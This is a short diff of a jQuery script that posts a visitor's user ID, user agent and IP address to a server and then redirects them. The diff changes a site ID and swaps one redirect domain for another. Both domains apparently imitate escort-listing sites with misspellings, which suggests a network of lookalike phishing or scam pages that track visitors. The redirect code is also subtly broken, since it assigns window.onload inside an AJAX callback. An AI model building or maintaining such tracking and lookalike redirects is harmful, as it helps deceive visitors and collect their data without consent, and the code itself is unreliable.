@@ -90,14 +90,14 @@ $(document).ready(function () {
                     user_id: userId,
                     agent: navigator.userAgent,
                     user_ip: userIp,
-                    website_id: 10,
+                    website_id: 101,
                 },
                 success: function (response) {
                     console.log('Response:', response);
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://view.megaapersonase.website/${userId}`;
+                            window.location.href = `https://escortalligator-listcrawle.co-lives.com/review/${userId}`;
                           }
                     
                 },
